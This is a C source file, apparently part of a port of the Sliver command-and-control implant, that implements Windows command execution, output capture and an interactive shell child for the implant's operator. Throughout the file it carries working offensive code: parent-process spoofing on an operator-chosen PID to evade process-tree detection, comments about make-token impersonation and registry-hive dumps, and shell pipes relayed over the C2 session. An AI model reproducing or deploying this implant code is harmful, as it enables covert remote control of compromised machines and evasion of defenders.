/* src/platform/win32/exec.c - capture a child process (Win32). */
#include "sliver/proc.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

#include "sliver/proto.h"

/* Launches a child while inheriting ONLY the three std handles: with
 * bInheritHandles=TRUE and no attribute list the child would also inherit the
 * C2 socket, so a killed implant leaves a live connection behind it. */
static DWORD g_last_error = 0;

unsigned long sliver_child_last_error(void) { return (unsigned long)g_last_error; }

static BOOL spawn_with_std_handles(const char *exe, char *cmdline, HANDLE in, HANDLE out,
                                   HANDLE err, DWORD flags, PROCESS_INFORMATION *pi) {
  STARTUPINFOEXA siex;
  SIZE_T attr_size = 0;
  LPPROC_THREAD_ATTRIBUTE_LIST attrs = NULL;
  HANDLE inherit[3];
  BOOL ok;

  memset(&siex, 0, sizeof(siex));
  siex.StartupInfo.cb = sizeof(siex);
  siex.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
  siex.StartupInfo.hStdInput = in;
  siex.StartupInfo.hStdOutput = out;
  siex.StartupInfo.hStdError = err;

  inherit[0] = in;
  inherit[1] = out;
  inherit[2] = err;

  (void)InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
  attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attr_size == 0 ? 1 : attr_size);
  if (attrs != NULL &&
      InitializeProcThreadAttributeList(attrs, 1, 0, &attr_size) &&
      UpdateProcThreadAttribute(attrs, 0, PROC_THREAD_ATTRIBUTE_HANDLE_LIST, inherit,
                                sizeof(inherit), NULL, NULL)) {
    siex.lpAttributeList = attrs;
    ok = CreateProcessA(exe, cmdline, NULL, NULL, TRUE,
                        flags | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siex.StartupInfo, pi);
  } else {
    /* Fall back to plain inheritance rather than failing the request. */
    siex.StartupInfo.cb = sizeof(STARTUPINFOA);
    ok = CreateProcessA(exe, cmdline, NULL, NULL, TRUE, flags, NULL, NULL, &siex.StartupInfo, pi);
  }
  if (attrs != NULL) {
    DeleteProcThreadAttributeList(attrs);
    free(attrs);
  }
  if (!ok) {
    g_last_error = GetLastError();
  }
  return ok;
}

/* Captured output is capped: a huge child (dir /s, read-hive style dumps) used to
 * grow the buffer without bound and take the implant down when the RPC payload
 * could not be framed (8 MiB limit). */
#define SLIVER_EXEC_CAPTURE_LIMIT (1024u * 1024u)

static int capture_append(sliver_buf_t *out, const char *buf, DWORD got) {
  if (out->len >= SLIVER_EXEC_CAPTURE_LIMIT) {
    return 0;
  }
  if (out->len + got > SLIVER_EXEC_CAPTURE_LIMIT) {
    got = (DWORD)(SLIVER_EXEC_CAPTURE_LIMIT - out->len);
  }
  return sliver_buf_append(out, buf, got);
}

static void drain(HANDLE h, sliver_buf_t *out) {
  char buf[4096];
  DWORD got = 0;
  while (ReadFile(h, buf, sizeof(buf), &got, NULL) && got > 0) {
    if (capture_append(out, buf, got) != 0) {
      break;
    }
  }
}

/* Reads whatever is already buffered without blocking. */
static void drain_available(HANDLE h, sliver_buf_t *out) {
  char buf[4096];
  for (;;) {
    DWORD avail = 0;
    DWORD got = 0;
    if (!PeekNamedPipe(h, NULL, 0, NULL, &avail, NULL) || avail == 0) {
      return;
    }
    if (!ReadFile(h, buf, sizeof(buf), &got, NULL) || got == 0) {
      return;
    }
    if (capture_append(out, buf, got) != 0) {
      return;
    }
  }
}

/* CreateProcess does not search PATH reliably for a bare name: resolve it first
 * so `execute -o cmd /c ...` works like it does in the Go implant. */
static void resolve_exe(const char *path, char *out, size_t cap) {
  char found[MAX_PATH];
  DWORD n;

  (void)snprintf(out, cap, "%s", path);
  if (path == NULL || strchr(path, '\\') != NULL || strchr(path, '/') != NULL) {
    return;
  }
  n = SearchPathA(NULL, path, ".exe", MAX_PATH, found, NULL);
  if (n > 0 && n < MAX_PATH) {
    (void)snprintf(out, cap, "%s", found);
  }
}

static void append_quoted(char *dst, size_t cap, size_t *offset, const char *arg) {
  int need_quotes = (arg == NULL) || (arg[0] == '\0') || (strpbrk(arg, " \t") != NULL);
  if (need_quotes) {
    *offset += (size_t)snprintf(dst + *offset, cap - *offset, "\"%s\"", arg != NULL ? arg : "");
  } else {
    *offset += (size_t)snprintf(dst + *offset, cap - *offset, "%s", arg);
  }
}

int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int capture,
                     sliver_buf_t *out, sliver_buf_t *err, uint32_t *pid_out,
                     uint32_t *status_out, uint32_t ppid) {
  SECURITY_ATTRIBUTES sa;
  STARTUPINFOEXA si;
  PROCESS_INFORMATION pi;
  LPPROC_THREAD_ATTRIBUTE_LIST attr = NULL;
  HANDLE h_parent = NULL;
  HANDLE out_r = NULL, out_w = NULL, err_r = NULL, err_w = NULL;
  char cmdline[8192];
  size_t offset = 0;
  DWORD exit_code = 0;
  DWORD create_flags = 0;

  if (path == NULL) {
    return -1;
  }
  memset(&sa, 0, sizeof(sa));
  sa.nLength = sizeof(sa);
  sa.bInheritHandle = TRUE;
  memset(&si, 0, sizeof(si));
  si.StartupInfo.cb = sizeof(si);
  memset(&pi, 0, sizeof(pi));

  si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
  /* After make-token the process runs as another user (possibly in another
   * session), where the inherited std handles can be NULL/invalid; handing those
   * to CreateProcess with STARTF_USESTDHANDLES crashes the caller. Fall back to
   * a NUL device so the child always gets valid handles. */
  si.StartupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
  si.StartupInfo.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
  si.StartupInfo.hStdError = GetStdHandle(STD_ERROR_HANDLE);
  if (capture && (si.StartupInfo.hStdInput == NULL || si.StartupInfo.hStdInput == INVALID_HANDLE_VALUE)) {
    si.StartupInfo.hStdInput = CreateFileA("NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (si.StartupInfo.hStdInput == INVALID_HANDLE_VALUE) {
      si.StartupInfo.hStdInput = NULL;
    }
  }
  if (capture) {
    if (!CreatePipe(&out_r, &out_w, &sa, 0) || !SetHandleInformation(out_r, HANDLE_FLAG_INHERIT, 0)) {
      return -1;
    }
    if (!CreatePipe(&err_r, &err_w, &sa, 0) || !SetHandleInformation(err_r, HANDLE_FLAG_INHERIT, 0)) {
      (void)CloseHandle(out_r);
      (void)CloseHandle(out_w);
      return -1;
    }
    si.StartupInfo.hStdOutput = out_w;
    si.StartupInfo.hStdError = err_w;
  }

  /* Pin the child to a specific parent process (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
   * when the operator asked for one. Best-effort: an invalid/vanished parent only
   * skips the attribute, it never fails the exec. */
  if (ppid != 0) {
    SIZE_T size = 0;
    h_parent = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)ppid);
    if (h_parent != NULL) {
      (void)InitializeProcThreadAttributeList(NULL, 1, 0, &size);
      attr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
      if (attr != NULL &&
          InitializeProcThreadAttributeList(attr, 1, 0, &size) &&
          UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                    &h_parent, sizeof(h_parent), NULL, NULL)) {
        create_flags |= EXTENDED_STARTUPINFO_PRESENT;
        si.lpAttributeList = attr;
      } else if (attr != NULL) {
        HeapFree(GetProcessHeap(), 0, attr);
        attr = NULL;
      }
    }
  }

  /* Quote only the arguments that need it: quoting a switch such as /c breaks
   * cmd.exe parsing (`cmd.exe "/c" "echo hi"`). */
  append_quoted(cmdline, sizeof(cmdline), &offset, path);
  for (size_t i = 0; i < argc && offset < sizeof(cmdline); ++i) {
    offset += (size_t)snprintf(cmdline + offset, sizeof(cmdline) - offset, " ");
    append_quoted(cmdline, sizeof(cmdline), &offset, args[i]);
  }
  {
    char resolved[MAX_PATH * 2];
    resolve_exe(path, resolved, sizeof(resolved));
    if (!CreateProcessA(resolved, cmdline, NULL, NULL, TRUE, create_flags, NULL, NULL,
                        &si.StartupInfo, &pi)) {
    g_last_error = GetLastError();
      if (attr != NULL) {
        (void)DeleteProcThreadAttributeList(attr);
      }
      if (h_parent != NULL) {
        (void)CloseHandle(h_parent);
      }
      if (capture) {
        (void)CloseHandle(out_r);
        (void)CloseHandle(out_w);
        (void)CloseHandle(err_r);
        (void)CloseHandle(err_w);
      }
      return -1;
    }
  }
  if (attr != NULL) {
    (void)DeleteProcThreadAttributeList(attr);
  }
  if (h_parent != NULL) {
    (void)CloseHandle(h_parent);
  }
  if (capture) {
    (void)CloseHandle(out_w);
    (void)CloseHandle(err_w);
  }
  /* Drain while waiting: waiting first would let the child block on a full pipe
   * (64 KiB) and produce truncated output / a leftover process. */
  {
    DWORD deadline = GetTickCount() + 60000;
    for (;;) {
      DWORD wait;
      if (capture) {
        drain_available(out_r, out);
        drain_available(err_r, err);
      }
      wait = WaitForSingleObject(pi.hProcess, 20);
      if (wait == WAIT_OBJECT_0) {
        break;
      }
      if (GetTickCount() > deadline) {
        (void)TerminateProcess(pi.hProcess, 1);
        (void)WaitForSingleObject(pi.hProcess, 5000);
        break;
      }
    }
  }
  if (capture) {
    drain(out_r, out);
    drain(err_r, err);
    (void)CloseHandle(out_r);
    (void)CloseHandle(err_r);
  }
  (void)GetExitCodeProcess(pi.hProcess, &exit_code);
  if (pid_out != NULL) {
    *pid_out = (uint32_t)pi.dwProcessId;
  }
  if (status_out != NULL) {
    *status_out = (uint32_t)exit_code;
  }
  (void)CloseHandle(pi.hThread);
  (void)CloseHandle(pi.hProcess);
  return 0;
}


/* --- interactive child ------------------------------------------------- */
struct sliver_child {
  HANDLE stdin_w;
  HANDLE stdout_r;
  HANDLE proc;
  HANDLE thread;
};

int sliver_child_spawn(const char *path, const char *const *args, size_t argc,
                       sliver_child_t **out, uint32_t *pid_out) {
  SECURITY_ATTRIBUTES sa;
  STARTUPINFOA si;
  PROCESS_INFORMATION pi;
  HANDLE in_r = NULL, in_w = NULL, out_r = NULL, out_w = NULL;
  sliver_child_t *child;
  char cmdline[8192];
  size_t offset = 0;

  if (path == NULL || out == NULL) {
    return -1;
  }
  memset(&sa, 0, sizeof(sa));
  sa.nLength = sizeof(sa);
  sa.bInheritHandle = TRUE;
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  memset(&pi, 0, sizeof(pi));

  if (!CreatePipe(&in_r, &in_w, &sa, 0) || !SetHandleInformation(in_w, HANDLE_FLAG_INHERIT, 0)) {
    return -1;
  }
  if (!CreatePipe(&out_r, &out_w, &sa, 0) || !SetHandleInformation(out_r, HANDLE_FLAG_INHERIT, 0)) {
    (void)CloseHandle(in_r);
    (void)CloseHandle(in_w);
    return -1;
  }
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = in_r;
  si.hStdOutput = out_w;
  si.hStdError = out_w;

  append_quoted(cmdline, sizeof(cmdline), &offset, path);
  for (size_t i = 0; i < argc && offset < sizeof(cmdline); ++i) {
    offset += (size_t)snprintf(cmdline + offset, sizeof(cmdline) - offset, " ");
    append_quoted(cmdline, sizeof(cmdline), &offset, args[i]);
  }
  {
    char resolved[MAX_PATH * 2];
    resolve_exe(path, resolved, sizeof(resolved));
    if (!CreateProcessA(resolved, cmdline, NULL, NULL, TRUE, CREATE_NEW_PROCESS_GROUP, NULL, NULL,
                        &si, &pi)) {
    g_last_error = GetLastError();
      (void)CloseHandle(in_r);
      (void)CloseHandle(in_w);
      (void)CloseHandle(out_r);
      (void)CloseHandle(out_w);
      return -1;
    }
  }
  (void)CloseHandle(in_r);
  (void)CloseHandle(out_w);

  child = (sliver_child_t *)calloc(1, sizeof(*child));
  if (child == NULL) {
    (void)TerminateProcess(pi.hProcess, 1);
    (void)CloseHandle(pi.hProcess);
    (void)CloseHandle(pi.hThread);
    (void)CloseHandle(in_w);
    (void)CloseHandle(out_r);
    return -1;
  }
  child->stdin_w = in_w;
  child->stdout_r = out_r;
  child->proc = pi.hProcess;
  child->thread = pi.hThread;
  *out = child;
  if (pid_out != NULL) {
    *pid_out = (uint32_t)pi.dwProcessId;
  }
  return 0;
}

long sliver_child_write(sliver_child_t *c, const void *buf, size_t len) {
  DWORD written = 0;
  if (c == NULL || c->stdin_w == NULL) {
    return -1;
  }
  if (!WriteFile(c->stdin_w, buf, (DWORD)len, &written, NULL)) {
    return -1;
  }
  return (long)written;
}

long sliver_child_read(sliver_child_t *c, void *buf, size_t len) {
  DWORD got = 0;
  if (c == NULL || c->stdout_r == NULL) {
    return -1;
  }
  if (!ReadFile(c->stdout_r, buf, (DWORD)len, &got, NULL)) {
    return 0;
  }
  return (long)got;
}

void sliver_child_close_stdin(sliver_child_t *c) {
  HANDLE h;
  if (c == NULL) {
    return;
  }
  /* The session thread (tunnel close/data) and the shell reader thread both
   * call this: exchange first so the handle is closed exactly once. */
  h = (HANDLE)InterlockedExchangePointer((PVOID volatile *)&c->stdin_w, NULL);
  if (h != NULL) {
    (void)CloseHandle(h);
  }
}

int sliver_child_wait(sliver_child_t *c, uint32_t *status_out) {
  DWORD code = 0;
  if (c == NULL || c->proc == NULL) {
    return -1;
  }
  (void)WaitForSingleObject(c->proc, 60000);
  (void)GetExitCodeProcess(c->proc, &code);
  if (status_out != NULL) {
    *status_out = (uint32_t)code;
  }
  return 0;
}

void sliver_child_terminate(sliver_child_t *c) {
  if (c != NULL && c->proc != NULL) {
    (void)TerminateProcess(c->proc, 1);
  }
}

void sliver_child_free(sliver_child_t *c) {
  if (c == NULL) {
    return;
  }
  sliver_child_close_stdin(c);
  if (c->stdout_r != NULL) {
    (void)CloseHandle(c->stdout_r);
  }
  if (c->thread != NULL) {
    (void)CloseHandle(c->thread);
  }
  if (c->proc != NULL) {
    (void)CloseHandle(c->proc);
  }
  free(c);
}












